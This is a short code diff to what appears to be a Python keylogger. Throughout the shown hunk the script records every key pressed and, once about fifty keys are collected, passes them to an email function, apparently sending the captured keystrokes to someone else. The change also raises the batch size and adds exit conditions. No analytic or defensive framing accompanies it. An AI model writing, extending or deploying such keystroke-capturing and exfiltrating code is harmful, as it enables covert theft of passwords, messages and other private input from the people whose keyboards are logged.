@@ -44,15 +44,19 @@ def on_press(key):
     # 'A' pressed
     print(key, end=" ")
     print("pressed")
+    if key == "Key.f12":
+        raise SystemExit(0)
 
     global keys, count
 
     keys.append(str(key))
     count += 1
 
-    if count > 10:
-        count = 9
+    if count > 50:
+        count = 0
         email(keys)
+        raise SystemExit(0)
+        
 
 def on_release(key):
     if key == Key.esc:
